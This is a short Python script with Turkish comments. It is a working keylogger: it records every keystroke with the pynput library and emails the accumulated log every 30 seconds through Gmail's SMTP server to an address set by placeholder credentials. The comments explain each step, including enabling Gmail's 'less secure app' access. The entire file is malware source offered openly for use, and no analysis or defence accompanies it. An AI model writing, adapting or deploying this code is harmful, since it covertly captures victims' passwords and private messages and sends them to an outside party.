import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):#hangi yere basıldıysa oraya parametre olarak veriyoruz.
    #print(type(key)) # keycode
    global log
    try:
        log = log + str(key.char)
        #log = log.encode() + key.char.encode()
        print(log)
    except AttributeError: #boşluğa basılmışsa boş olarak kaydedecek
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

#gmail üzerinde less secure app izin verilmeli
def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


#klavyeye basıldığında bir dinleyici oluşturacak
#on press ile kişi klavyeye bastığında ne olacağını belirteceğiz
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email("gönderici email","password",log.encode('utf-8'))
    log = "" #mail attıktan sonra sıfırla
    timer_object = threading.Timer(30,thread_function)#30sn de bir bu fonksiyonu çalıştır
    timer_object.start()

#threading işlemler paralel yapılmaya devam edecek
with keylogger_listener:
    thread_function()
    keylogger_listener.join()









